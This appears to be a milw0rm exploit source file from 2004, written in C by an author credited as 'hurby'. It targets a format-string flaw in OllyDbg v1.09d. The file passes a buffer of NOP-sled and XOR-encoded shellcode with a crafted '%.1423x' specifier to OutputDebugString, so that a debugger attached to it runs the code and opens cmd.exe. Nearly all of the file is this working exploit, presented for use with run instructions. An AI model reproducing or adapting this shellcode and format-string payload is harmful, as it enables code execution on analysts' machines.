// Exploit opens a new cmd.exe.Tested on win2k(en)+sp4(en)+ollydbg v1.09d
// Open exploit with ollydebug and run the exploit from ollydebug(F9 key).
// Coded by Ahmet Cihan(a.k.a. hurby)
// Thanx to r3d_b4r0n, Murat Erdo??an(a.k.a. Stormwr), Onur Cihan(a.k.a.eurnie and 3710336), Orhan Tun????z and Mehmet Yakut.

#include <stdio.h>
#include <windows.h>
#include <winbase.h>

#pragma comment(lib,\"kernel32.lib\")

void main(){
        unsigned char buffer[] =
\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\
\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\
\\x90\\x90\\x90\\x90\\xEB\\x0F\\x58\\x80\\x30\\x99\\x40\\x81\\x38\\x54\\x55\\x52\\x4B\\x75\\xF4\\xEB\\x05\\xE8\\xEC\\xFF\\xFF\\xFF\\
\\x12\\x75\\xCC\\x12\\x75\\xF1\\xFC\\xE1\\xFC\\xB9\\xF1\\xFA\\xF4\\xFD\\xB7\\x14\\xDC\\x61\\xC9\\x21\\x26\\x17\\x98\\xE1\\x66\\x49\\
\\x54\\x55\\x52\\x4B\\xCD%.1423x\\x3E\\x02\\x4B\\x02\";

        OutputDebugString(buffer);
}

// milw0rm.com [2004-08-10]
